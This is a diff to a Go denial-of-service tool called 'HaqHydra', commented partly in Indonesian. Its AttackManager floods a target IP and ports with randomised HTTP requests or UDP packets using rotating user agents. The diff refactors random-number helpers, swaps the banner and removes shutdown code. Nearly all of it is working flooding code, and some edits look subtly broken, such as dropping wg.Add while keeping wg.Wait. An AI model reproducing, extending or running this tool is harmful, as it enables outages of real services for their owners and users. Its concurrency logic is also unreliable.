@@ -2,7 +2,7 @@ package main
 
 import (
 	"bufio"
-	"crypto/rand"
+	"crypto/rand" // Untuk angka acak kriptografis
 	"fmt"
 	"io"
 	"log"
@@ -10,6 +10,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"strconv" // <<<<<<< IMPOR UNTUK KONVERSI ANGKA
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -33,11 +34,18 @@ var (
 // --- Banner ---
 const BANNER = `
 ░█▀▀▀█░░█░░░█░█▀▀█░█▀▀▄░█▀▀▄░░░░█░░░█░█▀▀█░█▀▀▄░█▀▀█░
- ▄ .▄ ▄▄▄· .▄▄▄       ▄ .▄ ▄· ▄▌·▄▄▄▄  ▄▄▄   ▄▄▄· 
-██▪▐█▐█ ▀█ ▐▀•▀█     ██▪▐█▐█▪██▌██▪ ██ ▀▄ █·▐█ ▀█ 
-██▀▐█▄█▀▀█ █▌·.█▌    ██▀▐█▐█▌▐█▪▐█· ▐█▌▐▀▀▄ ▄█▀▀█ 
-██▌▐▀▐█ ▪▐▌▐█▪▄█·    ██▌▐▀ ▐█▀·.██. ██ ▐█•█▌▐█ ▪▐▌
-▀▀▀ · ▀  ▀ ·▀▀█.     ▀▀▀ ·  ▀ • ▀▀▀▀▀• .▀  ▀ ▀  ▀ 
+░█░░░█░░█░░░█░█░░█░█░░░░█░░░░░░░░█░░░█░█░░█░█░░░░█░░░░
+░█▀▀▀█░░█░░░█░█▀▀█░█▀▀▄░█▀▀▄░░░░█░░░█░█▀▀█░█▀▀▄░█▀▀▀█░
+░█░░░█░░█░░░█░█░░░░█░░░░█░░░░░░░░█░░░█░█░░░░█░░░░█░░░░
+░█▀▀▀█░░█▄▄█▀░█░░░░█▀▀▀░░█▀▀▀░░░░╚█████╝░█░░░░█▀▀▀░░█░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+███████░███████░███████░███████░███████░███████░███████░
+██╔════╝░██╔════╝░██╔════╝░██╔════╝░██╔════╝░██╔════╝░██╔════╝
+███████╗░███████╗░███████╗░███████╗░███████╗░███████╗░███████╗
+██╔════╝░╚════██║░╚════██║░╚════██║░╚════██║░╚════██║░╚════██║
+███████╗░███████║░███████║░███████║░███████║░███████║░███████║
+╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░
 `
 
 // --- User Agents ---
@@ -65,10 +73,22 @@ var USER_AGENTS = []string{
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 // --- Helper Functions ---
+// rand.Int digunakan dari crypto/rand karena lebih aman untuk acak kriptografis
+func getRandomBigInt(max int64) *big.Int {
+	n, err := rand.Int(rand.Reader, big.NewInt(max))
+	if err != nil {
+		// Fallback ke math/rand jika crypto/rand gagal (jarang terjadi)
+		// Atau log error dan return nilai default
+		log.Printf("Warning: crypto/rand failed, falling back to math/rand for random number: %v", err)
+		return big.NewInt(int64(time.Now().Nanosecond() % int(max))) // Pendekatan sederhana
+	}
+	return n
+}
+
 func generateRandomString(length int) string {
 	result := make([]byte, length)
 	for i := range result {
-		randomIndex, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		randomIndex := getRandomBigInt(int64(len(charset)))
 		result[i] = charset[randomIndex.Int64()]
 	}
 	return string(result)
@@ -78,7 +98,7 @@ func getRandomUserAgent() string {
 	if len(USER_AGENTS) == 0 {
 		return "HaqHydraClient"
 	}
-	randomIndex, _ := rand.Int(rand.Reader, big.NewInt(int64(len(USER_AGENTS))))
+	randomIndex := getRandomBigInt(int64(len(USER_AGENTS)))
 	return USER_AGENTS[randomIndex.Int64()]
 }
 
@@ -112,9 +132,6 @@ type AttackManager struct {
 	numSocketsPerThread int
 	stopCh          chan struct{} // For goroutine stop signals
 	wg              sync.WaitGroup // To wait for goroutines
-	// For HTTP, we need a selector to manage multiple sockets non-blockingly
-	// For simplicity in this example, each goroutine will manage its own connection(s).
-	// A more advanced implementation might use a shared selector pool or a single selector.
 }
 
 func NewAttackManager(targetIP string, ports []int, threadsPerPort int, attackType, mode string, durationSec int64, httpMethod string) *AttackManager {
@@ -215,10 +232,10 @@ func (am *AttackManager) generateHTTPRequest(target, method, mode string) string
 }
 
 func (am *AttackManager) generateUDPPacket() []byte {
-	payloadLen := 500 + rand.Intn(500) // Panjang acak antara 500-1000
+	payloadLen := 500 + int(getRandomBigInt(500).Int64()) // Panjang acak antara 500-1000
 	payload := make([]byte, payloadLen)
 	for i := range payload {
-		randomIndex, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		randomIndex := getRandomBigInt(int64(len(charset)))
 		payload[i] = charset[randomIndex.Int64()]
 	}
 	return payload
@@ -233,10 +250,9 @@ func (am *AttackManager) openConnection(port int, limit int) {
 	address := fmt.Sprintf("%s:%d", am.targetIP, port)
 
 	if am.attackType == "http" {
-		// Untuk HTTP, kita gunakan DialTimeout untuk mengontrol waktu koneksi
 		conn, err = net.DialTimeout("tcp", address, 5*time.Second)
 	} else if am.attackType == "udp" {
-		// Untuk UDP, kita gunakan Dial untuk mendapatkan koneksi UDP
+		// UDP Dial returns a UDPConn
 		conn, err = net.Dial("udp", address)
 	} else {
 		am.log("Unsupported attack type %s", am.attackType)
@@ -291,8 +307,7 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 			am.log("Received stop signal. Exiting HTTP goroutine for %d.", port)
 			return
 		default:
-			// Tidak perlu select timeout di sini karena kita akan mengontrolnya
-			// dengan time.Sleep dan pengecekan durasi.
+			// Lanjutkan jika tidak ada sinyal berhenti
 		}
 
 		// Cek durasi serangan
@@ -411,7 +426,7 @@ func (am *AttackManager) udpAttackGoroutine(conn net.Conn, port int) {
 		}
 		am.atomicInc(&sentRequestsTotal)
 
-		time.Sleep(time.Millisecond * time.Duration(1+rand.Intn(4))) // Jeda acak kecil
+		time.Sleep(time.Millisecond * time.Duration(1+int(getRandomBigInt(4).Int64()))) // Jeda acak kecil
 	}
 }
 
@@ -449,7 +464,7 @@ func (am *AttackManager) Start() {
 	// Mulai goroutine serangan
 	for _, port := range am.ports {
 		for i := 0; i < am.threadsPerPort; i++ {
-			am.wg.Add(1) // Tambah ke wg sebelum goroutine dimulai
+			// Pemanggilan openConnection sekarang menangani pembuatan koneksi dan goroutine
 			go am.openConnection(port, am.numSocketsPerThread)
 		}
 	}
@@ -464,16 +479,14 @@ func (am *AttackManager) Start() {
 		<-stopEvent // Tunggu sinyal berhenti global (dari Ctrl+C)
 	}
 
-	am.wg.Wait() // Tunggu semua goroutine serangan selesai
+	// Tunggu semua goroutine serangan selesai setelah sinyal berhenti dikirim
+	am.wg.Wait()
 	fmt.Println("\nHaqHydra attack finished.")
 }
 
-func (am *AttackManager) Stop() {
-	logger.Println("Stopping all goroutines.")
-	close(stopEvent) // Kirim sinyal berhenti global
-	am.wg.Wait() // Tunggu goroutine selesai
-	logger.Println("All goroutines stopped. Cleanup complete.")
-}
+// Stop members tidak secara eksplisit dipanggil di sini karena Stop()
+// sudah dicakup oleh penanganan Ctrl+C dan loop durasi yang mengarah ke close(stopEvent).
+// wg.Wait() di akhir Start() adalah mekanisme cleanup utama.
 
 // --- Main Function ---
 func main() {
@@ -576,7 +589,6 @@ func main() {
 		<-sig
 		fmt.Println("\nCtrl+C detected. Initiating shutdown...")
 		close(stopEvent) // Kirim sinyal berhenti global
-		// Tidak memanggil manager.Stop() di sini karena Start() akan menunggu stopEvent
 	}()
 
 	manager.Start()
